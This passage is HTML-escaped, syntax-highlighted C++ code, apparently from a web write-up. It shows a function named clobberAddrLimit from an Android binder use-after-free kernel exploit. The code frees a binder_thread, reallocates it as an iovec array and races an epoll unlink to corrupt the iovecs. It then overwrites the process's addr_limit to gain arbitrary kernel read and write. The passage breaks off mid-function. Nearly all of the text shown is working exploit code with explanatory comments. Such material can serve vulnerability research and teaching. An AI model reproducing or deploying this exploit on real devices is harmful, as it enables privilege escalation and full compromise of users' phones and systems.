&lt;/span>&lt;span class="lnt"> 33
&lt;/span>&lt;span class="lnt"> 34
&lt;/span>&lt;span class="lnt"> 35
&lt;/span>&lt;span class="lnt"> 36
&lt;/span>&lt;span class="lnt"> 37
&lt;/span>&lt;span class="lnt"> 38
&lt;/span>&lt;span class="lnt"> 39
&lt;/span>&lt;span class="lnt"> 40
&lt;/span>&lt;span class="lnt"> 41
&lt;/span>&lt;span class="lnt"> 42
&lt;/span>&lt;span class="lnt"> 43
&lt;/span>&lt;span class="lnt"> 44
&lt;/span>&lt;span class="lnt"> 45
&lt;/span>&lt;span class="lnt"> 46
&lt;/span>&lt;span class="lnt"> 47
&lt;/span>&lt;span class="lnt"> 48
&lt;/span>&lt;span class="lnt"> 49
&lt;/span>&lt;span class="lnt"> 50
&lt;/span>&lt;span class="lnt"> 51
&lt;/span>&lt;span class="lnt"> 52
&lt;/span>&lt;span class="lnt"> 53
&lt;/span>&lt;span class="lnt"> 54
&lt;/span>&lt;span class="lnt"> 55
&lt;/span>&lt;span class="lnt"> 56
&lt;/span>&lt;span class="lnt"> 57
&lt;/span>&lt;span class="lnt"> 58
&lt;/span>&lt;span class="lnt"> 59
&lt;/span>&lt;span class="lnt"> 60
&lt;/span>&lt;span class="lnt"> 61
&lt;/span>&lt;span class="lnt"> 62
&lt;/span>&lt;span class="lnt"> 63
&lt;/span>&lt;span class="lnt"> 64
&lt;/span>&lt;span class="lnt"> 65
&lt;/span>&lt;span class="lnt"> 66
&lt;/span>&lt;span class="lnt"> 67
&lt;/span>&lt;span class="lnt"> 68
&lt;/span>&lt;span class="lnt"> 69
&lt;/span>&lt;span class="lnt"> 70
&lt;/span>&lt;span class="lnt"> 71
&lt;/span>&lt;span class="lnt"> 72
&lt;/span>&lt;span class="lnt"> 73
&lt;/span>&lt;span class="lnt"> 74
&lt;/span>&lt;span class="lnt"> 75
&lt;/span>&lt;span class="lnt"> 76
&lt;/span>&lt;span class="lnt"> 77
&lt;/span>&lt;span class="lnt"> 78
&lt;/span>&lt;span class="lnt"> 79
&lt;/span>&lt;span class="lnt"> 80
&lt;/span>&lt;span class="lnt"> 81
&lt;/span>&lt;span class="lnt"> 82
&lt;/span>&lt;span class="lnt"> 83
&lt;/span>&lt;span class="lnt"> 84
&lt;/span>&lt;span class="lnt"> 85
&lt;/span>&lt;span class="lnt"> 86
&lt;/span>&lt;span class="lnt"> 87
&lt;/span>&lt;span class="lnt"> 88
&lt;/span>&lt;span class="lnt"> 89
&lt;/span>&lt;span class="lnt"> 90
&lt;/span>&lt;span class="lnt"> 91
&lt;/span>&lt;span class="lnt"> 92
&lt;/span>&lt;span class="lnt"> 93
&lt;/span>&lt;span class="lnt"> 94
&lt;/span>&lt;span class="lnt"> 95
&lt;/span>&lt;span class="lnt"> 96
&lt;/span>&lt;span class="lnt"> 97
&lt;/span>&lt;span class="lnt"> 98
&lt;/span>&lt;span class="lnt"> 99
&lt;/span>&lt;span class="lnt">100
&lt;/span>&lt;span class="lnt">101
&lt;/span>&lt;span class="lnt">102
&lt;/span>&lt;span class="lnt">103
&lt;/span>&lt;span class="lnt">104
&lt;/span>&lt;span class="lnt">105
&lt;/span>&lt;span class="lnt">106
&lt;/span>&lt;span class="lnt">107
&lt;/span>&lt;span class="lnt">108
&lt;/span>&lt;span class="lnt">109
&lt;/span>&lt;span class="lnt">110
&lt;/span>&lt;span class="lnt">111
&lt;/span>&lt;span class="lnt">112
&lt;/span>&lt;span class="lnt">113
&lt;/span>&lt;span class="lnt">114
&lt;/span>&lt;span class="lnt">115
&lt;/span>&lt;span class="lnt">116
&lt;/span>&lt;span class="lnt">117
&lt;/span>&lt;span class="lnt">118
&lt;/span>&lt;span class="lnt">119
&lt;/span>&lt;span class="lnt">120
&lt;/span>&lt;span class="lnt">121
&lt;/span>&lt;span class="lnt">122
&lt;/span>&lt;span class="lnt">123
&lt;/span>&lt;span class="lnt">124
&lt;/span>&lt;span class="lnt">125
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="n">BinderUaF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="nf">clobberAddrLimit&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">sock_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">ssize_t&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">msghdr&lt;/span> &lt;span class="n">message&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">nullptr&lt;/span>&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">iovec&lt;/span> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_COUNT&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">nullptr&lt;/span>&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Get binder fd
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">setupBinder&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Create event poll
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">setupEventPoll&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Setting up socket&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">socketpair&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">AF_UNIX&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">SOCK_STREAM&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sock_fd&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] Unable to create socketpair&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] Socketpair created successfully&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// We will just write junk data to socket so that when recvmsg
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// is called it process the fist valid iovec with this junk data
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// and then blocks and waits for the rest of the data to be received
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">static&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">junkSocketData&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x41&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Writing junk data to socket&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sock_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">junkSocketData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">junkSocketData&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">junkSocketData&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesWritten&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">junkSocketData&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Write junk data to the socket so that when recvmsg is
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// called, it process the first valid iovec with this junk
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// data and then blocks for the rest of the incoming socket data
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Setting up iovecs&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// We want to block after processing the iovec at IOVEC_WQ_INDEX,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// because then, we can trigger the unlink operation and get the
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// next iovecs corrupted to gain scoped write.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">mmap4gbAlignedPage&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">m_4gb_aligned_page&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mh">0x41414141&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="mh">0x42424242&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Prepare the data buffer that will be written to socket
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Setting addr_limit to 0xFFFFFFFFFFFFFFFF in arm64
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// will result in crash because of a check in do_page_fault
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// However, x86_64 does not have this check. But it&amp;#39;s better
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// to set it to 0xFFFFFFFFFFFFFFFE so that this same code can
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// be used in arm64 as well.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">static&lt;/span> &lt;span class="kt">uint64_t&lt;/span> &lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX].iov_len
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0x41414141&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">uint64_t&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_task_struct&lt;/span> &lt;span class="o">+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">OFFSET_TASK_STRUCT_ADDR_LIMIT&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="c1">// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="mh">0xFFFFFFFFFFFFFFFE&lt;/span> &lt;span class="c1">// addr_limit value
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Prepare the message
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">msg_iov&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">msg_iovlen&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">IOVEC_COUNT&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Now link the poll wait queue to binder thread wait queue
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">linkEventPollWaitQueueToBinderThreadWaitQueue&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// We should trigger the unlink operation when we
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// have the binder_thread reallocated as iovec array
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Now fork
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">pid_t&lt;/span> &lt;span class="n">childPid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fork&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">childPid&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// child process
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// There is a race window between the unlink and blocking
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// in writev, so sleep for a while to ensure that we are
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// blocking in writev before the unlink happens
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Trigger the unlink operation on the reallocated chunk
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">unlinkEventPollWaitQueueFromBinderThreadWaitQueue&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Now, at this point, the iovecStack[IOVEC_WQ_INDEX].iov_len
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// and iovecStack[IOVEC_WQ_INDEX + 1].iov_base is clobbered
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Write rest of the data to the socket so that recvmsg starts
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// processing the corrupted iovecs and we get scoped write and
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// finally arbitrary write
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sock_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">nBytesWritten&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nBytesWritten&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">finalSocketData&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_SUCCESS&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// parent process
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// I have seen some races which hinders the reallocation.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// So, now freeing the binder_thread after fork.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">freeBinderThread&lt;/span>&lt;span class="p">();&lt;/span>
